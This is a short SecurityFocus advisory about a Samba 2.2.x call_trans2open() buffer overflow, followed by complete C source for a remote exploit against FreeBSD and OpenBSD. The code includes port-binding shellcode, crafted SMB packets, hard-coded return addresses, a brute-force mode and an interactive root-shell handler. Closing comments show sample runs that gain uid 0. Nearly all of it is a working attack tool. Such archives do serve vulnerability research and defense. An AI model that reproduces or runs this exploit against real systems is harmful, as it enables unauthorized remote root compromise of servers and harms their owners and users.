source: http://www.securityfocus.com/bid/7294/info

A buffer overflow vulnerability has been reported for Samba. The problem occurs when copying user-supplied data into a static buffer. By passing excessive data to an affected Samba server, it may be possible for an anonymous user to corrupt sensitive locations in memory.

Successful exploitation of this issue could allow an attacker to execute arbitrary commands, with the privileges of the Samba process.

It should be noted that this vulnerability affects Samba 2.2.8 and earlier. Samba-TNG 0.3.1 and earlier are also affected. 

/*
**
** [+] Title: Samba v2.2.x call_trans2open() Remote Overrun exploit for XxxxBSD
**                                                                  11/Apr/2003
** [+] Exploit code: 0x82-Remote.54AAb4.xpl.c
**
** -- 
** exploit by "you dong-hun"(Xpl017Elz), <szoahc@hotmail.com>. 
** My World: http://x82.i21c.net & http://x82.inetcop.org
**
*/
/*
** -=-= POINT! POINT! POINT! POINT! POINT! =-=-
**
** source/smbd/trans2.c:
**
** line:205  static int call_trans2open(connection_struct *conn, char *inbuf, char *outbuf, int bufsize,
** line:206                          char **pparams, int total_params, char **ppdata, int total_data)
** line:207  {
**           [...]
** line:219          char *pname;
** line:220          int16 namelen;
**           [...]
** line:222          pstring fname; // source/include/smb.h:
**                                  // line:162  #define PSTRING_LEN 1024
**                                  // line:165  typedef char pstring[PSTRING_LEN];
**           [...]
** line:250          namelen = strlen(pname)+1;
** line:251
** line:252          StrnCpy(fname,pname,namelen); // here.
**
** reply_trans2() function:
**
** line:3173 int reply_trans2(connection_struct *conn, char *inbuf,char *outbuf,int length,int bufsize)
**           [...]
** line:3358                 outsize = call_trans2open(conn, inbuf, outbuf, bufsize,
** line:3359                                 &params, total_params, &data, total_data);
** line:3360                 END_PROFILE_NESTED(Trans2_open);
** line:3361                 break;
**
** Visual point that change flowing of this program,
** happen after overwrited variables.
**
** Detailed information references digitaldefense's Advisory.
**
** http://www.digitaldefense.net/labs/advisories/DDI-1013.txt
**
** Also, thank about eSDee's exploit that remind Samba application communication method.
** --
** Thank you.
**
*/

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <netdb.h>

struct os {
	int num;
	char *ost;
	u_long shell;
};
struct os plat[]=
{
	{
		0,"FreeBSD 4.6.2-RELEASE #0 i386, Samba v2.2.x",
		/*
		   v2.2.0 exploited successfully. (Brute-Force mode)
		   v2.2.1a exploited successfully. (Brute-Force mode)
		   v2.2.2 exploited successfully. (Brute-Force mode)
		   v2.2.3 exploited successfully. (Default mode)
		   v2.2.4 exploited successfully. (Default mode)
		   v2.2.5 exploited successfully. (Default mode)
		   v2.2.6 exploited successfully. (Default mode)
		   v2.2.7 exploited successfully. (Default mode)
		   v2.2.8 exploited successfully. (Default mode)
		*/
		0xbfbff482
	},
	{
		1,"OpenBSD 3.0 GENERIC#94 i386, Samba v2.2.x",
		/*
		   v2.2.0 exploited successfully. (Brute-Force mode)
		   v2.2.1a exploited successfully. (Brute-Force mode)
		   v2.2.2 exploited successfully. (Brute-Force mode)
		   v2.2.3 exploited successfully. (Default mode)
		   v2.2.4 exploited successfully. (Default mode)
		   v2.2.5 exploited successfully. (Default mode)
		   v2.2.6 exploited successfully. (Default mode)
		   v2.2.7 exploited successfully. (Default mode)
		   v2.2.8 exploited successfully. (Default mode)
		*/
		0xdfbfd482
	},
	{
		2,NULL,0
	}
};

char shellcode[]=
	/* 86bytes portbinding shellcode by bighawk */
	"\x31\xc9"              // xor ecx, ecx
	"\xf7\xe1"              // mul ecx
	"\x51"                  // push ecx
	"\x41"                  // inc ecx
	"\x51"                  // push ecx
	"\x41"                  // inc ecx
	"\x51"                  // push ecx
	"\x51"                  // push ecx
	"\xb0\x61"              // mov al, 97
	"\xcd\x80"              // int 80h
	"\x89\xc3"              // mov ebx, eax
	"\x52"                  // push edx
	"\x66\x68\x27\x10"      // push word 4135
	"\x66\x51"              // push cx
	"\x89\xe6"              // mov esi, esp
	"\xb1\x10"              // mov cl, 16
	"\x51"                  // push ecx
	"\x56"                  // push esi
	"\x50"                  // push eax
	"\x50"                  // push eax
	"\xb0\x68"              // mov al, 104
	"\xcd\x80"              // int 80h
	"\x51"                  // push ecx
	"\x53"                  // push ebx
	"\x53"                  // push ebx
	"\xb0\x6a"              // mov al, 106
	"\xcd\x80"              // int 80h
	"\x52"                  // push edx
	"\x52"                  // push edx
	"\x53"                  // push ebx
	"\x53"                  // push ebx
	"\xb0\x1e"              // mov al, 30
	"\xcd\x80"              // int 80h
	"\xb1\x03"              // mov cl, 3
	"\x89\xc3"              // mov ebx, eax
	"\xb0\x5a"              // mov al, 90
	"\x49"                  // dec ecx
	"\x51"                  // push ecx
	"\x53"                  // push ebx
	"\x53"                  // push ebx
	"\xcd\x80"              // int 80h
	"\x41"                  // inc ecx
	"\xe2\xf5"              // loop-10
	"\x51"                  // push ecx
	"\x68\x2f\x2f\x73\x68"  // push dword 68732f2fh
	"\x68\x2f\x62\x69\x6e"  // push dword 6e69622fh
	"\x89\xe3"              // mov  ebx, esp
	"\x51"                  // push ecx
	"\x54"                  // push esp
	"\x53"                  // push ebx
	"\x53"                  // push ebx
	"\xb0\x3b"              // mov al, 59
	"\xcd\x80";             // int  80h

#define BRUTE_AT (64)
#define SH_PORT (10000)
#define ATK_PORT (139)
#define DF_NOP (0x41)
#define __BUF_LEN (0x00000463)
#define __LEN_PAD (0x0000012c)

void banrl();
int re_connt(int sock,int type);
void usage(char *p_name);
int setsock(char *host,int port);
void send_recv_sh(int sock);
int __atk_code_send_recv(int sock,u_long shell);

int __atk_code_send_recv(int sock,u_long shell)
{
	int eat_buf_set=0,atk_buf_pos=0;
	char atk_buf[0x960+5];
	char its_exploit_packet[]={
		0x00,0x04,0x09,0x60,0xff,0x53,0x4d,0x42,
		0x32,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
		0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
		0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,
		0x64,0x00,0x00,0x00,0x00,0xd0,0x07,0x0c,
		0x00,0xd0,0x07,0x0c,0x00,0x00,0x00,0x00,
		0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xd0,
		0x07,0x43,0x00,0x0c,0x00,0x14,0x08,0x01,
		0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
		0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
		0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
		0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x90,
		0x00
	};
	char its_first_time_conn[]={
		0x00,0x00,0x00,0x2e,0xff,0x53,0x4d,0x42,
		0x73,0x00,0x00,0x00,0x00,0x08,0x01,0x00,
		0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
		0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
		0x64,0x00,0x01,0x00,0x00,0xff,0x00,0x00,
		0x00,0x00,0x20,0x02,0x00,0x01,0x00,0x00,
		0x00,0x00
	};
	char its_second_time_conn[]={
		0x00,0x00,0x00,0x3c,0xff,0x53,0x4d,0x42,
		0x70,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
		0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
		0x00,0x00,0x00,0x00,0x00,0x00,0x0c,0x20,
		0x64,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
		0x5c,0x5c,0x69,0x70,0x63,0x24,0x25,0x6e,
		0x6f,0x62,0x6f,0x64,0x79,0x00,0x00,0x00,
		0x00,0x00,0x00,0x00,0x49,0x50,0x43,0x24
	};
	int first_packet_len=sizeof(its_first_time_conn);
	int second_packet_len=sizeof(its_second_time_conn);

	memset((char *)atk_buf,0,sizeof(atk_buf));
	memcpy(atk_buf,its_first_time_conn,sizeof(its_first_time_conn));
	send(sock,atk_buf,first_packet_len,0);
	recv(sock,atk_buf,sizeof(atk_buf)-1,0);

	memset((char *)atk_buf,0,sizeof(atk_buf));
	memcpy(atk_buf,its_second_time_conn,sizeof(its_second_time_conn));
	send(sock,atk_buf,second_packet_len,0);
	recv(sock,atk_buf,sizeof(atk_buf)-1,0);

	memset((char *)atk_buf,0,sizeof(atk_buf));
	memcpy(atk_buf+atk_buf_pos,its_exploit_packet,sizeof(its_exploit_packet));
	atk_buf_pos+=sizeof(its_exploit_packet);

	memset(atk_buf+atk_buf_pos,DF_NOP,((__BUF_LEN-__LEN_PAD)-strlen(shellcode)-atk_buf_pos));
	atk_buf_pos+=((__BUF_LEN-__LEN_PAD)-strlen(shellcode)-atk_buf_pos);

	memcpy(atk_buf+atk_buf_pos,shellcode,strlen(shellcode));
	atk_buf_pos+=strlen(shellcode);

	memset(atk_buf+atk_buf_pos,DF_NOP,__LEN_PAD);
	atk_buf_pos+=(__LEN_PAD);
#ifdef __DEBUG
	sleep(10);
#endif
	{
		*(long *)&atk_buf[atk_buf_pos]=(shell-(0x82*2));// fake fp
		atk_buf_pos+=4;
		*(long *)&atk_buf[atk_buf_pos]=(shell);// retaddr;
		atk_buf_pos+=4;
		*(long *)&atk_buf[atk_buf_pos]=(shell-(0x82*2));// fake fp
		atk_buf_pos+=4;
	}
	send(sock,atk_buf,sizeof(atk_buf)-1,0);
}

int main(int argc,char *argv[])
{
	int sock,whtl,type=0,brute_f=0;
	char tg_host[0x82]="localhost";
	u_long shell=plat[type].shell;
	
	(void)banrl();
	if(argc<2)
	{
		(void)usage(argv[0]);
	}
	
	while((whtl=getopt(argc,argv,"H:h:S:s:T:t:IiB:b"))!=-1)
	{
		extern char *optarg;
		switch(whtl)
		{
			case 'H':
			case 'h':
				memset((char *)tg_host,0,sizeof(tg_host));
				strncpy(tg_host,optarg,sizeof(tg_host)-1);
				break;
				
			case 'S':
			case 's':
				shell=strtoul(optarg,0,0);
				break;
				
			case 'T':
			case 't':
				if((type=atoi(optarg))>1)
				{
					(void)usage(argv[0]);
				}
				else shell=plat[type].shell;
				break;
				
			case 'I':
			case 'i':
				(void)usage(argv[0]);
				break;
				
			case 'B':
			case 'b':
				brute_f++;
				break;
				
			case '?':
				fprintf(stderr," Try `%s -i' for more information.\n\n",argv[0]);
				exit(-1);
				break;
		}
	}
	if(brute_f)
	{
		fprintf(stdout," **\n ** OK, It's good selection, Attack tries %d times.\n",BRUTE_AT);
		fprintf(stdout," ** If work process is boring, drink coffee and wait. hehe ;-D\n **\n\n");
		fprintf(stdout," [*] Brute-Force mode:\n\n");
		fprintf(stdout," |----+----+----+----+----+----+----+----+----+----+----+----+----|");
		fprintf(stdout,"\n |");

		for(brute_f=0;brute_f<BRUTE_AT;brute_f++)
		{
			fflush(stdout);
			fprintf(stdout,"=");

			shell+=(0x100);
			sock=(int)setsock(tg_host,ATK_PORT);
			
			if((int)re_connt(sock,0)==-1)
			{
				while(!(brute_f>=BRUTE_AT-1))
				{
					fprintf(stdout,"=");
					brute_f++;
				}
				fprintf(stdout,"|\n\n");
				fprintf(stderr," [-] Connect Failed.\n\n");
				exit(-1);
			}
			
			__atk_code_send_recv(sock,shell);
			close(sock);
			sleep(2);
			sock=(int)setsock(tg_host,SH_PORT);
			
			if((int)re_connt(sock,0)==-1)
			{
				continue;
			}
			
			while(!(brute_f>=BRUTE_AT-1))
			{
				fprintf(stdout,"=");
				brute_f++;
			}
			
			fprintf(stdout,"|\n\n");
			fprintf(stdout," [+] Shellcode address: %p\n",shell);
			fprintf(stdout," [*] Brute-Force end !!\n\n");
			fprintf(stdout," **\n ** Bind shellcode is port 10000.\n");
			fprintf(stdout," ** If bindshell port number was changed, change connection port.\n **\n\n");
			
			(void)send_recv_sh(sock);
		}

		fprintf(stdout,"|\n\n **\n");
		fprintf(stdout," ** Brute-Force exploit failed. Reason is simple.\n **\n");
		fprintf(stdout," ** Could not search shellcode's position during %d times.\n",BRUTE_AT);
		fprintf(stdout," ** Or, Operating System's target that we attack isn't.\n");
		fprintf(stdout," ** OOops ! is server Samba version doubtful ??\n **\n\n");
		exit(-1);
	}
	else
	{
		fprintf(stdout," [0] Target: %s\n",plat[type].ost);
		fprintf(stdout," [1] Set socket.\n");
		sock=(int)setsock(tg_host,ATK_PORT);
		(int)re_connt(sock,1);
		
		fprintf(stdout," [2] Make shellcode & Send Packet.\n");
		__atk_code_send_recv(sock,shell);
		close(sock);
		
		fprintf(stdout," [3] Trying %s:%d.\n",tg_host,SH_PORT);
		sleep(2);
		
		sock=(int)setsock(tg_host,SH_PORT);
		(int)re_connt(sock,1);
		
		fprintf(stdout," [*] Connected to %s:%d.\n",tg_host,SH_PORT);
		(void)send_recv_sh(sock);
	}
}

int setsock(char *hostip,int port)
{
	int sock;
	struct hostent *he;
	struct sockaddr_in x82;

	if((he=gethostbyname(hostip))==NULL)
	{
		return(-1);
	}

	if((sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))==-1)
	{
		return(-1);
	}

	x82.sin_family=AF_INET;
	x82.sin_port=htons(port);
	x82.sin_addr=*((struct in_addr *)he->h_addr);
	memset(&(x82.sin_zero),0,8);

	if(connect(sock,(struct sockaddr *)&x82,sizeof(struct sockaddr))==-1)
	{
		return(-1);
	}
	return(sock);
}

int re_connt(int sock,int type)
{
	if(sock==-1)
	{
		if(type)
		{
			fprintf(stderr," [-] Connect Failed.\n\n");
			exit(-1);
		}
		else return(-1);
	}
}

void send_recv_sh(int sock)
{
	int pk;
	struct timeval tm;
	char *t_cmd="su -l\n";
	char *n_cmd="uname -a;id;exec sh -i\n";
	char rbuf[1024];
	fd_set rset;
	memset((char *)rbuf,0,sizeof(rbuf));
	fprintf(stdout," [*] Executed shell successfully !\n");
	fprintf(stdout," [*] Command: # su -l; uname -a; id; exec sh -i\n\n");
	send(sock,t_cmd,strlen(t_cmd),0);
	send(sock,n_cmd,strlen(n_cmd),0);

	tm.tv_sec=10;
	tm.tv_usec=0;
	
	while(1)
	{
		fflush(stdout);
		FD_ZERO(&rset);
		FD_SET(sock,&rset);
		FD_SET(STDIN_FILENO,&rset);

		select(sock+1,&rset,NULL,NULL,&tm);

		if(FD_ISSET(sock,&rset))
		{
			pk=read(sock,rbuf,sizeof(rbuf)-1);
			if(pk<=0)
			{
				fprintf(stdout," [*] Happy-Exploit\n\n");
				close(sock);
				exit(0);
			}
			rbuf[pk]=0;
			fprintf(stdout,"%s",rbuf);
		}
		if(FD_ISSET(STDIN_FILENO,&rset))
		{
			pk=read(STDIN_FILENO,rbuf,sizeof(rbuf)-1);
			if(pk>0)
			{
				rbuf[pk]=0;
				write(sock,rbuf,pk);
			}
		}
	}
	return;
}

void banrl()
{
	fprintf(stdout,"\n Samba v2.2.x call_trans2open() Remote Overrun exploit for XxxxBSD\n");
	fprintf(stdout,"                                                     by Xpl017Elz.\n\n");
}

void usage(char *p_name)
{
	int r_s=0;
	fprintf(stdout," Usage: %s -option [argument]\n",p_name);
	fprintf(stdout,"\n\t-h - hostname. (default: localhost)\n");
	fprintf(stdout,"\t-s - shellcode. (select target)\n");
	fprintf(stdout,"\t-t - target number.\n");
	fprintf(stdout,"\t-b - auto brute-force attack mode.\n");
	fprintf(stdout,"\t-i - help information.\n\n");
	fprintf(stdout," Select target number:\n\n");
	
	for(;;)
	{
		if(plat[r_s].ost==NULL)
			break;
		else fprintf(stdout,"\t{%d} %s\n",plat[r_s].num,plat[r_s].ost);
		r_s++;
	}
	fprintf(stdout,"\n Example> %s -hlocalhost -s 0x82828282\n\n",p_name);
	exit(-1);
}

/*
**
** OpenBSD exploit:
** --
** bash$ ./0x82-Remote.54AAb4.xpl -h 61.37.xxx.xx -t1
**
**  Samba v2.2.x call_trans2open() Remote Overrun exploit for XxxxBSD
**                                                      by Xpl017Elz.
**
**  [0] Target: OpenBSD 3.0 GENERIC#94 i386, Samba v2.2.x
**  [1] Set socket.
**  [2] Make shellcode & Send Packet.
**  [3] Trying 61.37.xxx.xx:10000.
**  [*] Connected to 61.37.xxx.xx:10000.
**  [*] Executed shell successfully !
**  [*] Command: # su -l; uname -a; id; exec sh -i
**
** tset: standard error: Operation not supported
** OpenBSD testsub 3.0 GENERIC#94 i386
** uid=0(root) gid=0(wheel) groups=0(wheel), 2(kmem), 3(sys), 4(tty), 5(operator), 20(staff), 31(guest)
** sh: No controlling tty (open /dev/tty: Device not configured)
** sh: Can't find tty file descriptor
** sh: warning: won't have full job control
** #
** --
**
** FreeBSD exploit:
** --
** bash$ ./0x82-Remote.54AAb4.xpl -h 61.37.xxx.xx -t0
**
**  Samba v2.2.x call_trans2open() Remote Overrun exploit for XxxxBSD
**                                                      by Xpl017Elz.
**
**  [0] Target: FreeBSD 4.6.2-RELEASE #0 i386, Samba v2.2.x
**  [1] Set socket.
**  [2] Make shellcode & Send Packet.
**  [3] Trying 61.37.xxx.xx:10000.
**  [*] Connected to 61.37.xxx.xx:10000.
**  [*] Executed shell successfully !
**  [*] Command: # su -l; uname -a; id; exec sh -i
**
** Warning: no access to tty (Bad file descriptor).
** Thus no job control in this shell.
** FreeBSD localhost 4.6.2-RELEASE FreeBSD 4.6.2-RELEASE #0: Wed Aug 14 21:23:26 GMT 2002     
** murray@builder.freebsdmall.com:/usr/src/sys/compile/GENERIC  i386
** uid=0(root) gid=0(wheel) groups=0(wheel), 2(kmem), 3(sys), 4(tty), 5(operator), 20(staff), 31(guest)
** sh: can't access tty; job control turned off
** #
** --
**
*/
